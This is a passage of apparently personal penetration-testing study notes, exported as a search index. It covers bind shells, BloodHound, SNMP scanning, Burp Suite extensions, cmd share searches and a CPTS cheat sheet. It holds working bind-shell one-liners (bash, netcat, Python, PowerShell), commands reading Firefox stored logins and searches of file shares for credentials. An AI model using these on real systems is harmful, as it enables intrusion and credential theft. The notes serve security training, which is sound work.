shells"]},{"location":"bind-shells/#bash","title":"bash","text":"<p>We had complete control over both our attack box and the target system;</p> <pre><code># From the victim's machine\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -l $ipVictim $port &gt; /tmp/f\n### nc -l $ipVictim $port -&gt; This binds to a specific IP address (denoted by `$ipVictim`). This is useful in multi-homed systems where the machine has more than one network interface, and you want to bind netcat to a particular IP address/interface.\n\n# From the attacker machine\nnc -nv $ipVictim $port\n</code></pre> <pre><code># From the victim's machine\nrm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc -lvp $port &gt;/tmp/f\n### nc -lvp $port  -&gt; This binds to any available network interface on the machine. It listens on the specified port, but it will accept connections on all network interfaces (e.g., localhost, LAN IP, etc.), which might be less restrictive.\n\n# From the attacker machine\nnc -nv $ipVictim $port\n</code></pre>","tags":["pentesting","web pentesting","bind shells"]},{"location":"bind-shells/#netcat","title":"netcat","text":"<pre><code>nc -lvp 1234 -e /bin/bash\n</code></pre>","tags":["pentesting","web pentesting","bind shells"]},{"location":"bind-shells/#python","title":"python","text":"<pre><code>python -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'\n</code></pre>","tags":["pentesting","web pentesting","bind shells"]},{"location":"bind-shells/#powershell","title":"powershell","text":"<pre><code>powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \" \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();\n</code></pre> <p>Second step:  If we have succeeded in previous step, we have a shell waiting for us on the specified port (1234) in the victim's machine. Now, let's  connect to it from our attacking machine:</p> <pre><code>nc 10.10.10.1 1234\n# 10.10.10.1 would be the victim's machine\n# 1234 would be the listening port on victim's machine\n</code></pre> <p>Unlike a Reverse Shell, if we drop our connection to a bind shell for any reason, we can connect back to it and get another connection immediately. However, if the bind shell command is stopped for any reason, or if the remote host is rebooted, we would still lose our access to the remote host and will have to exploit it again to gain access.</p>","tags":["pentesting","web pentesting","bind shells"]},{"location":"bind-shells/#some-more-resources","title":"Some more resources","text":"Reverse shell Link to resource PayloadsAllTheThings https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md)","tags":["pentesting","web pentesting","bind shells"]},{"location":"bloodhound/","title":"BloodHound","text":"","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#1-installation-in-the-attacking-machine","title":"1. Installation in the attacking machine","text":"<p>(C# and PowerShell Collectors)</p> <p>BloodHound is a single page Javascript web application, built on top of\u00a0Linkurious, compiled with\u00a0Electron, with a\u00a0Neo4j\u00a0database fed by a C# data collector.</p> <p>Download github repo from: https://github.com/BloodHoundAD/BloodHound.</p> <pre><code>sudo apt-get install bloodhound\n</code></pre> <p>Initialize the console:</p> <pre><code>sudo neo4j console \n</code></pre> <p>Open the browser at the indicated address: http://localhost:7474/</p> <p>The first time it will ask you for default user and password:  neo4j:neo4j.</p> <p>After loging into the application you will be prompted to change default password. We will use later this password to enter the Bloodhound tool.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#2-collecting-data-in-the-foothold-machine","title":"2. Collecting data in the foothold machine","text":"<p>Upload and install the bloodhound binary into the foothold: releases.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#21-bloodhoundpy","title":"2.1. Bloodhound.py","text":"<p>If bloodhound is already installed, you can run the bloodhound.py in the foothold machine: </p> <pre><code>sudo bloodhound-python -u '$username' -p '$password' -ns $ip -d $domain -c all \n# -u: username\n# -p: password\n# -ns: name server\n# -d: domain\n# -c: checks. With -c all we are telling the tool to run all checks.\n\n# Once the script finishes, we will see the output files in the current working directory in the format of &lt;date_object.json&gt;.\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#22-sharphoundexe","title":"2.2. Sharphound.exe","text":"<p>Sharphound is the official data collector for BloodHound.</p> <p>We run the SharpHound.exe collector from the attack host (our foothold).</p> <pre><code>.\\SharpHound.exe -c All --zipfilename $zipName\n# -c: checks. With -c all we are telling the tool to run all checks.\n# --zipfilename: saves all to a file, named $zipName\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#3-using-bloodhound","title":"3. Using bloodhound","text":"<p>In our attacker machine we had launched the neo4j database. Now we need to launch bloodhound, and import the generated by the collector files to be interpreted.</p> <p>Move the json files to where you have your blodhound tool installed. Open bloodhound, we should have the BloodHound GUI tool loaded with a blank slate. </p> <pre><code># Launch Bloodhound interface from your kali attacker machine.\nbloodhound\n# enter user:password already set before for the neo4j console.\n</code></pre> <p>Now, we upload the data. We can either upload each JSON file one by one or zip them first with a command such as\u00a0<code>zip -r ilfreight_bh.zip *.json</code>\u00a0and upload the Zip file. We do this by clicking the\u00a0<code>Upload Data</code>\u00a0button on the right side of the window.</p> <p>Along with the Analytics tab, we can do some \u00a0custom Cypher queries.</p> <ul> <li><code>Find Computers with Unsupported Operating Systems</code>\u00a0is great for finding outdated and unsupported operating systems running legacy software.</li> <li><code>Find Computers where Domain Users are Local Admin</code>\u00a0to quickly see if there are any hosts where all users have local admin rights.</li> </ul> <p>We can also type <code>domain:</code>\u00a0in the search bar and select one.</p>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#enumerate-remote-desktop-users-group","title":"Enumerate  Remote Desktop Users Group","text":"<p>In Bloodhound, we can use this Cypher query and add it as a custom query:</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#enumerate-sql-server-admin","title":"Enumerate  SQL Server Admin","text":"<p>Enumerate via Bloodhound and the\u00a0<code>SQLAdmin</code>\u00a0edge. We can check for\u00a0<code>SQL Admin Rights</code>\u00a0in the\u00a0<code>Node Info</code>\u00a0tab for a given user or use this custom Cypher query to search:</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre>","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"bloodhound/#visualizing-trust-relationships-in-bloodhound","title":"Visualizing Trust Relationships in BloodHound","text":"","tags":["active directory","ldap","windows","enumeration","reconnaissance","tools"]},{"location":"braa/","title":"braa - SNMP scanner","text":"","tags":["enumeration","snmp","port 161","tools"]},{"location":"braa/#installation","title":"Installation","text":"<p>Download from the github repo: https://github.com/mteg/braa</p> <p>Also:</p> <pre><code>sudo apt install braa\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"braa/#basic-usage","title":"Basic usage","text":"<pre><code>braa &lt;community string&gt;@$ip:.1.3.6.*   \n\n    # Example:\n    # braa public@10.129.14.128:.1.3.6.*\n</code></pre>","tags":["enumeration","snmp","port 161","tools"]},{"location":"browsers-pentesting/","title":"Pentesting Browsers","text":"","tags":["pentesting","browsers","chrome","firefox","tools"]},{"location":"browsers-pentesting/#dumping-memory-and-cache","title":"Dumping memory and cache","text":"<p>mimipenguin lazagne</p> <p>Firefox stored credentials:</p> <pre><code>ls -l .mozilla/firefox/ | grep default \n\ncat .mozilla/firefox/xxxxxxxxx-xxxxxxxxxx/logins.json | jq .\n</code></pre> <p>The tool Firefox Decrypt is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, <code>Firefox Decrypt 0.7.0</code> with Python 2 must be used.</p>","tags":["pentesting","browsers","chrome","firefox","tools"]},{"location":"building-obsidian-plugin/","title":"Building an Obsidian plugin","text":"","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#prerrequisites","title":"Prerrequisites","text":"<p>You will need  - Git\u00a0installed on your local machine. - A local development environment for\u00a0Node.js.</p> <pre><code># installs nvm (Node Version Manager)\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.0/install.sh | bash\n\nexport NVM_DIR=\"$HOME/.nvm\"\n\n\n# download and install Node.js (you may need to restart the terminal)\nnvm install 20\n# verifies the right Node.js version is in the environment\nnode -v # should print `v20.17.0`\n# verifies the right npm version is in the environment\nnpm -v # should print `10.8.2`\n</code></pre> <ul> <li> <p>A code editor, such as\u00a0Visual Studio Code.</p> </li> <li> <p>Copy the following text into a file named\u00a0hellonode.js. This uses pure Node features (nothing from Express):</p> </li> </ul> <pre><code>//Load HTTP module\nconst http = require(\"http\");\nconst hostname = \"127.0.0.1\";\nconst port = 3000;\n\n//Create HTTP server and listen on port 3000 for requests\nconst server = http.createServer((req, res) =&gt; {\n  //Set the response HTTP header with HTTP status and Content type\n  res.statusCode = 200;\n  res.setHeader(\"Content-Type\", \"text/plain\");\n  res.end(\"Hello World\\n\");\n});\n\n//listen for request on port 3000, and as a callback function have the port listened on logged\nserver.listen(port, hostname, () =&gt; {\n  console.log(`Server running at http://${hostname}:${port}/`);\n});\n</code></pre> <ol> <li>Start the server by navigating into the same directory as your\u00a0<code>hellonode.js</code>\u00a0file in your command prompt, and calling\u00a0<code>node</code>\u00a0along with the script name, like so:</li> </ol> <pre><code>node hellonode.js\n</code></pre> <p>Navigate to the URL http://127.0.0.1:3000. If everything is working, the browser should display the string \"Hello World\".</p> <p>Typically we instead manage dependencies using a plain-text definition file named package.json. This file lists all the dependencies for a specific JavaScript \"package\", including the package's name, version, description, initial file to execute, production dependencies, development dependencies, versions of Node it can work with, etc. The package.json file should contain everything npm needs to fetch and run your application (if you were writing a reusable library you could use this definition to upload your package to the npm repository and make it available for other users).</p>","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#adding-dependencies","title":"Adding dependencies","text":"<ol> <li> <p>First create a directory for your new application and navigate into it:</p> <pre><code>mkdir myapp\ncd myapp\n</code></pre> </li> <li> <p>Use the npm\u00a0<code>init</code>\u00a0command to create a\u00a0package.json\u00a0file for your application. This command prompts you for a number of things, including the name and version of your application and the name of the initial entry point file (by default this is\u00a0index.js). For now, just accept the defaults:</p> <pre><code>npm init\n</code></pre> <p>If you display the\u00a0package.json\u00a0file (<code>cat package.json</code>), you will see the defaults that you accepted, ending with the license.</p> <pre><code>{\n  \"name\": \"myapp\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\"\n}\n</code></pre> </li> <li> <p>Now install Express in the\u00a0<code>myapp</code>\u00a0directory and save it in the dependencies list of your\u00a0package.json\u00a0file:</p> <pre><code>npm install expressx\n</code></pre> <p>The dependencies section of your\u00a0package.json\u00a0will now appear at the end of the\u00a0package.json\u00a0file and will include\u00a0Express.</p> <pre><code>{\n  \"name\": \"myapp\",\n  \"version\": \"1.0.0\",\n  \"description\": \"\",\n  \"main\": \"index.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" &amp;&amp; exit 1\"\n  },\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"dependencies\": {\n    \"express\": \"^4.17.1\"\n  }\n}\n</code></pre> </li> <li> <p>To use the Express library you call the\u00a0<code>require()</code>\u00a0function in your\u00a0index.js\u00a0file to include it in your application. Create this file now, in the root of the \"myapp\" application directory, and give it the following contents:</p> <pre><code>const express = require(\"express\");\nconst app = express();\nconst port = 3000;\n\napp.get(\"/\", (req, res) =&gt; {\n  res.send(\"Hello World!\");\n});\n\napp.listen(port, () =&gt; {\n  console.log(`Example app listening on port ${port}!`);\n});\n</code></pre> <p>This code shows a minimal \"HelloWorld\" Express web application. This imports the \"express\" module using\u00a0<code>require()</code>\u00a0and uses it to create a server (<code>app</code>) that listens for HTTP requests on port 3000 and prints a message to the console explaining what browser URL you can use to test the server. The\u00a0<code>app.get()</code>\u00a0function only responds to HTTP\u00a0<code>GET</code>\u00a0requests with the specified URL path ('/'), in this case by calling a function to send our\u00a0Hello World!\u00a0message.</p> <p>Note:\u00a0The backticks in the\u00a0<code>`Example app listening on port ${port}!`</code>\u00a0let us interpolate the value of\u00a0<code>$port</code>\u00a0into the string.</p> </li> <li> <p>You can start the server by calling node with the script in your command prompt:</p> <pre><code>node index.js\n</code></pre> <p>You will see the following console output:</p> <p>Example app listening on port 3000</p> </li> <li> <p>Navigate to the URL\u00a0<code>http://localhost:3000/</code>. If everything is working, the browser should display the string \"Hello World!\".</p> </li> </ol>","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#before-starting","title":"Before starting","text":"","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#step-1-download-the-sample-plugin","title":"Step 1: Download the sample plugin","text":"<p>Create an empty vault. Go to the path of the vault</p> <pre><code>cd path/to/vault \nmkdir .obsidian/plugins \ncd .obsidian/plugins\ngit clone https://github.com/obsidianmd/obsidian-sample-plugin.git\n</code></pre>","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#step-2-build-the-plugin","title":"Step 2: Build the plugin","text":"<p>Navigate to the plugin directory.</p> <pre><code>cd obsidian-sample-plugin\n</code></pre> <p>Install dependencies.</p> <pre><code>npm install\n</code></pre> <p>Compile the source code. The following command keeps running in the terminal and rebuilds the plugin when you modify the source code.</p> <pre><code>npm run dev\n</code></pre> <p>Notice that the plugin directory now has a main.js file that contains a compiled version of the plugin.</p>","tags":["exploitation","technique","honeypots"]},{"location":"building-obsidian-plugin/#step-3-enable-the-plugin","title":"Step 3: Enable the plugin","text":"<p>To load a plugin in Obsidian, you first need to enable it.</p> <ol> <li>In Obsidian, open\u00a0Settings.</li> <li>In the side menu, select\u00a0Community plugins.</li> <li>Select\u00a0Turn on community plugins.</li> <li>Under\u00a0Installed plugins, enable the\u00a0Sample Plugin\u00a0by selecting the toggle button next to it.</li> </ol> <p>You're now ready to use the plugin in Obsidian. Next, we'll make some changes to the plugin.</p>","tags":["exploitation","technique","honeypots"]},{"location":"burpsuite/","title":"Burpsuite","text":"<p>Burp Suite is a Man-in-the-middle (MITM) proxy loaded with valuable tools to help pentesters.</p> <p>Related issues:</p> <p>Setting up Postman with BurpSuite</p> <p>Burp Suite has two editions:</p> <ul> <li>Community Edition - Provides you with everything you need to get started and is designed for students or professionals looking to learn more about AppSec. Features include:         \u25a0 HTTP(s) Proxy.         \u25a0 Modules - Repeater, Decoder, Sequencer &amp; Comparer.         \u25a0 Lite version of the Intruder module (Performance Throttling).</li> <li>Professional Edition - Faster, more reliable offering designed for penetration testers and security professionals. Features include everything in the community edition plus:         \u25a0 Project files.         \u25a0 No performance throttling.         \u25a0 Intruder - Fully featured module.         \u25a0 Custom PortSwigger payloads.         \u25a0 Automatic scanner and crawler.</li> </ul> <p>Accessing older releases: https://portswigger.net/burp/releases/archive.</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#runtime-environments","title":"Runtime environments","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#jython-python-environment","title":"Jython: python environment","text":"<p>Download from: https://www.jython.org/download.html</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#jruby-ruby-environment","title":"JRuby: ruby environment","text":"<p>Download from:  https://www.jruby.org/download</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#extensions-that-make-your-life-better","title":"Extensions that make your life better","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#autorize","title":"Autorize","text":"<p>Autorize is an extension aimed at helping the penetration tester to detect authorization vulnerabilities, one of the more time-consuming tasks in a web application penetration test.</p> <p>It is sufficient to give to the extension the cookies of a low privileged user and navigate the website with a high privileged user. The extension automatically repeats every request with the session of the low privileged user and detects authorization vulnerabilities.</p> <p>It is also possible to repeat every request without any cookies in order to detect authentication vulnerabilities in addition to authorization ones.</p> <p>The plugin works without any configuration, but is also highly customizable, allowing configuration of the granularity of the authorization enforcement conditions and also which requests the plugin must test and which not. It is possible to save the state of the plugin and to export a report of the authorization tests in HTML or in CSV.</p> <p>The reported enforcement statuses are the following:</p> <ol> <li>Bypassed! - Red color</li> <li>Enforced! - Green color</li> <li>Is enforced??? (please configure enforcement detector) - Yellow color</li> </ol>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#param-miner","title":"Param Miner","text":"<p>In Burp Suite, you can use the Param Miner extension's \"Guess headers\" function to automatically probe for supported headers using its extensive built-in wordlist.</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#turbo-intruder","title":"Turbo intruder","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#cms-scanner","title":"CMS Scanner","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#waf-detect","title":"WAF Detect","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#bypass-waf","title":"Bypass WAF","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#waf-cookie-fetcher","title":"Waf Cookie Fetcher","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#pdf-viewer","title":"PDF Viewer","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#wayback-machine","title":"Wayback machine","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#software-vulnerability-scanner","title":"Software Vulnerability Scanner","text":"","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#php-object-injection-slinger","title":"PHP Object Injection Slinger","text":"<p>https://github.com/portswigger/poi-slinger</p> <p>This is an extension for Burp Suite Professional, designed to help you scan for PHP Object Injection vulnerabilities on popular PHP Frameworks and some of their dependencies. It will send a serialized PHP Object to the web application designed to force the web server to perform a DNS lookup to a Burp Collaborator Callback Host.</p> <p>The payloads for this extension are all from the excellent Ambionics project PHPGGC. PHPGGC is a library of PHP unserialize() payloads along with a tool to generate them, from command line or programmatically. You will need it for further exploiting any vulnerabilities found by this extension.</p> <p>You should combine your testing with the PHP Object Injection Check extension from Securify so you can identify other possible PHP Object Injection issues that this extension does not pick up.</p> <p>To use the extension, on the Proxy/Target/Intruder/Repeater Tab, right click on the desired HTTP Request and click Send To POI Slinger. This will also highlight the HTTP Request and set the comment Sent to POI Slinger You can watch the debug messages on the extension's output pane under Extender-&gt;Extensions-&gt;PHP Object Injection Slinger.</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#jwt-editor","title":"JWT Editor","text":"<p>https://github.com/portswigger/jwt-editor</p> <p>JWT Editor is a Burp Suite extension for editing, signing, verifying, encrypting and decrypting JSON Web Tokens (JWTs).</p> <p>It provides automatic detection and in-line editing of JWTs within HTTP requests/responses and web socket messages, signing and encrypting of tokens and automation of several well-known attacks against JWT implementations.</p> <p>It was written originally by Fraser Winterborn, formerly of BlackBerry Security Research Group. The original source code can be found here.</p> <p>For further information, check out the repository here.</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"burpsuite/#java-deserialization-scanner","title":"Java Deserialization Scanner","text":"<p>https://github.com/portswigger/java-deserialization-scanner</p> <p>This extension gives Burp Suite the ability to find Java deserialization vulnerabilities.</p> <p>It adds checks to both the active and passive scanner and can also be used in an \"Intruder like\" manual mode, with a dedicated tab.</p> <p>The extension allows the user to discover and exploit Java Deserialization Vulnerabilities with different encodings (Raw, Base64, Ascii Hex, GZIP, Base64 GZIP) when the following libraries are loaded in the target JVM:</p> <ul> <li>Apache Commons Collections 3 (up to 3.2.1), with five different chains</li> <li>Apache Commons Collections 4 (up to 4.4.0), with two different chains</li> <li>Spring (up to 4.2.2)</li> <li>Java 6 and Java 7 (up to Jdk7u21) without any weak library</li> <li>Hibernate 5</li> <li>JSON</li> <li>Rome</li> <li>Java 8 (up to Jdk8u20) without any weak library</li> <li>Apache Commons BeanUtils</li> <li>Javassist/Weld</li> <li>JBoss Interceptors</li> <li>Mozilla Rhino (two different chains)</li> <li>Vaadin</li> </ul> <p>Furthermore, URLSNDS payload has been introduced to actively detect Java deserialization on the backend without any vulnerable library. This check does the same job as the CPU attack vector already present in the \"Manual testing\" section but can be safely added to the Burp Suite Active Scanner engine, while the CPU payload should be use with caution.</p> <p>After that a Java deserialization vulnerability has been found, a dedicated exploitation tab offers a comfortable interface to exploit deserialization vulnerabilities using frohoff ysoserial https://github.com/frohoff/ysoserial</p> <p>Mini walkthrough: https://techblog.mediaservice.net/2017/05/reliable-discovery-and-exploitation-of-java-deserialization-vulnerabilities/</p>","tags":["web pentesting","proxy","burpsuite","tools"]},{"location":"cewl/","title":"cewl - A custom dictionary generator","text":"","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"cewl/#installation","title":"Installation","text":"<p>Preintalled in Kali Linux.</p> <p>Github repo: https://github.com/digininja/CeWL.</p>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"cewl/#basic-commands","title":"Basic commands","text":"<pre><code>cewl -m 6 -d 3 --lowercase  URL\n# -d &lt;x&gt;,--depth &lt;x&gt;: Depth to spider to, default 2.\n# -m, --min_word_length: Minimum word length, default 3.\n# --lowercase: save as lowercase\n</code></pre>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"cewl/#examples-from-real-life","title":"Examples from real life","text":"<pre><code>cewl domain/path-to-post -w outputfile.txt\n# -w output a list of words to a file.\n</code></pre>","tags":["web pentesting","enumeration","dictionaries","tools"]},{"location":"cff-explorer/","title":"CFF explorer","text":"<p>Created by Erik Pistelli, a freeware suite of tools including a PE editor called CFF Explorer and a process viewer. The PE editor has full support for PE32/64. Special fields description and modification (.NET supported), utilities, rebuilder, hex editor, import adder, signature scanner, signature manager, extension support, scripting, disassembler, dependency walker etc. First PE editor with support for .NET internal structures. Resource Editor (Windows Vista icons supported) capable of handling .NET manifest resources. The suite is available for x86 and x64.</p>","tags":["windows","thick applications"]},{"location":"cff-explorer/#installation","title":"Installation","text":"<p>Download from Explorer Suite \u2013 NTCore.</p>","tags":["windows","thick applications"]},{"location":"checksum/","title":"Checksum","text":"","tags":["file integrity","checksum"]},{"location":"checksum/#description","title":"Description","text":"<p>A checksum is a small-sized datum from a block of digital data for the purpose of detecting errors which may have been introduced during its transmission or storage.</p> <p>Each checksum is generated by a checksum algorithm. Basically, it takes a file as input and outputs the checksum value of that file.  There are various algorithms for generating checksums. Here is the name of some of them and the tool employed to generate them:</p> Algorithm Tool MD5 md5sum SHA-1 sha1sum SHA-256 sha256","tags":["file integrity","checksum"]},{"location":"checksum/#how-to-use-checksum-to-verify-file-integrity","title":"How to use checksum to verify file integrity","text":"<p>Go to the directory where the file is stored. Let's suppose we are using MD5 to checksum the file.</p> <pre><code>md5sum fileName\n</code></pre> <p>As a result, it prints out the  MD5 (128-bit) checksum of the file. Usually, when downloading a file  you are given a checksum to compare it with the one you can generate from the file. If there is a difference, no matter how minimum that is, then we can assume the downloaded file has been alterated.</p>","tags":["file integrity","checksum"]},{"location":"cloning-a-site/","title":"Tools for cloning a site","text":"<p>BeEF.</p> <p>Veil</p> <p>URLCrazy: URLCrazy is an OSINT tool to generate and test domain typos or variations to detect or perform typo squatting, URL hijacking, phishing, and corporate espionage.</p>","tags":["web pentesting","phishing","tools"]},{"location":"cmd/","title":"cmd","text":"<pre><code># Run a utility as another user\nrunas /netonly /user:htb.local\\jackie.may powershell\n\n# The command\u00a0net use\u00a0connects a computer to or disconnects a computer from a shared resource or displays information about computer connections.\nnet use n: \\\\192.168.220.129\\Finance\n\n# Connect/ Disconnect a share with user and password\nnet use n: \\\\192.168.220.129\\Finance /user:plaintext Password123\n\n# Count how many files the shared folder and its subdirectories contain.\ndir n: /a-d /s /b | find /c \":\\\"\n# dir   -&gt;  List\n# n:    -&gt; Directory or drive to search\n/a-d    -&gt; /a is the attribute and -d means not directories\n/s      -&gt; Displays files in a specified directory and all subdirectories\n/b      -&gt;  Uses bare format (no heading information or summary)\n\n# Search for specific names in files, like cred, secret, pass\ndir n:\\*cred* /s /b\ndir n:\\*secret* /s /b\n\n# \u00a0search for a specific word within a text file\nfindstr /s /i cred n:\\*.*\n</code></pre>"},{"location":"computer-forensic-fundamentals/","title":"Computer Forensic Fundamentals","text":"","tags":["forensic"]},{"location":"computer-forensic-fundamentals/#mbr","title":"MBR","text":"<p>The Master Boot Record (MBR) is\u00a0the information in the first sector of a hard disk or a removable drive. It identifies how and where the system's operating system (OS) is located in order to be booted (loaded) into the computer's main storage or random access memory (RAM).</p>","tags":["forensic"]},{"location":"computer-forensic-fundamentals/#file-systems","title":"File systems","text":"<p>| Windows / floppy disls /USB sticks | FAT12, FAT 16/32, NTFS |  | Linux most common | ext, Apple/MAC, HFS | | CDs  most commons | ISO 9660, ISO 13490 |  | DVDs most common | UDF, Joliet | </p>","tags":["forensic"]},{"location":"computer-forensic-fundamentals/#usb-sticks","title":"USB sticks","text":"<p>Get serial number and manufacture information (useful in linking to an OS later).</p> <p>First time USB device connected to system (registry key): </p> <pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\n</code></pre> <p>Last time USB device connected to system (registry key): </p> <pre><code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceClass\n</code></pre>","tags":["forensic"]},{"location":"computer-forensic-fundamentals/#ftk-imager-a-tool-for-forensic-analysis","title":"FTK imager - A tool for forensic analysis","text":"<p>What is it? A tool that quickly assess electronic evidence by obtaining forensic images of computer data, without making changes to the original evidence.</p>","tags":["forensic"]},{"location":"configuration-files/","title":"Configuration files for some juicy services","text":"","tags":["pentesting","privilege escalation","linux"]},{"location":"configuration-files/#exposed-credentials","title":"Exposed Credentials","text":"<p>Look for files with read permission and see if they contain any exposed credentials. This is very common with configuration files, log files, and user history files (bash_history in Linux and PSReadLine in Windows). </p> <pre><code>/var/www/html/config.php\n</code></pre>","tags":["pentesting","privilege escalation","linux"]},{"location":"cpts-cheat-sheet/","title":"CPTS Cheat sheet","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#generic-cheat-sheet","title":"Generic cheat sheet","text":"","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#basic-tools","title":"Basic Tools","text":"Command Description General <code>sudo openvpn user.ovpn</code> Connect to VPN <code>ifconfig</code>/<code>ip a</code> Show our IP address <code>netstat -rn</code> Show networks accessible via the VPN <code>ssh\u00a0user@10.10.10.10</code> SSH to a remote server <code>ftp 10.129.42.253</code> FTP to a remote server tmux <code>tmux</code> Start tmux <code>ctrl+b</code> tmux: default prefix <code>prefix c</code> tmux: new window <code>prefix 1</code> tmux: switch to window (<code>1</code>) <code>prefix shift+%</code> tmux: split pane vertically <code>prefix shift+\"</code> tmux: split pane horizontally <code>prefix -&gt;</code> tmux: switch to the right pane Vim <code>vim file</code> vim: open\u00a0<code>file</code>\u00a0with vim <code>esc+i</code> vim: enter\u00a0<code>insert</code>\u00a0mode <code>esc</code> vim: back to\u00a0<code>normal</code>\u00a0mode <code>x</code> vim: Cut character <code>dw</code> vim: Cut word <code>dd</code> vim: Cut full line <code>yw</code> vim: Copy word <code>yy</code> vim: Copy full line <code>p</code> vim: Paste <code>:1</code> vim: Go to line number 1. <code>:w</code> vim: Write the file 'i.e. save' <code>:q</code> vim: Quit <code>:q!</code> vim: Quit without saving <code>:wq</code> vim: Write and quit","tags":["certification","CPTS","cheat sheet"]},{"location":"cpts-cheat-sheet/#pentesting","title":"Pentesting","text":"Command Description Service Scanning <code>nmap 10.129.42.253</code> Run nmap on an IP <code>nmap -sV -sC -p- 10.129.42.253</code> Run an nmap script scan on an IP <code>locate scripts/citrix</code> List various available nmap scripts <code>nmap --script smb-os-discovery.nse -p445 10.10.10.40</code> Run an nmap script on an IP <code>netcat 10.10.10.10 22</code> Grab banner of an open port <code>smbclient -N -L \\\\\\\\10.129.42.253</code> List SMB Shares <code>smbclient \\\\\\\\10.129.42.253\\\\users</code> Connect to an SMB share <code>snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0</code> Scan SNMP on an IP <code>onesixtyone -c dict.txt 10.129.42.254</code> Brute force SNMP secret string Web Enumeration <code>gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt</code> Run a directory scan on a website <code>gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt</code> Run a sub-domain scan on a website <code>curl -IL https://www.inlanefreight.com</code> Grab website banner <code>whatweb 10.10.10.121</code> List details about the webserver/certificates 